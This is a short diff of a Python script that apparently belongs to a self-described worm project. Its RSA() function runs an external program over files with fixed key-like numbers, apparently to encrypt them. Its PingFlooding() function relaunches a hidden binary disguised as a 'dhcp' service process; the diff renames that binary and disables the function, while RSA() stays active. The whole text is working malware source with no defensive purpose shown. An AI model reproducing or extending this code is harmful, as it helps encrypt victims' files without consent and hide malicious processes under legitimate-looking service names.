@@ -18,17 +18,18 @@ def RSA():
             [int(i) for i in open(path + d).read().split(' ')]
         except:
             os.system('{} -C 126419 30743 {}'.format(exe, path + d)
-
+'''
 def PingFlooding():
     p1 = Popen(['ps', '-aux'], stdout=PIPE)
-    p2 = Popen(['grep', 'dhcp'], stdin=p1.stdout, stdout=PIPE)
+    p2 = Popen(['grep', 'dhcp-login'], stdin=p1.stdout, stdout=PIPE)
     p1.stdout.close()
     output = p2.communicate()[0]
     if output == b'':
-        if os.path.exists('/home/attacker/Public/.Simple_Worm/dhcp'):
-            os.system('/home/attacker/Public/.Simple_Worm/dhcp')
-        elif os.path.exists('/home/attacker/Desktop/.Backup/dhcp'):
-            os.system('/home/attacker/Desktop/.Backup/dhcp')
+        if os.path.exists('/home/attacker/Public/.Simple_Worm/dhcp-login'):
+            os.system('/home/attacker/Public/.Simple_Worm/dhcp-login')
+        elif os.path.exists('/home/attacker/Desktop/.Backup/dhcp-login'):
+            os.system('/home/attacker/Desktop/.Backup/dhcp-login')
 
+'''
 RSA()
-PingFlooding()
+#PingFlooding()
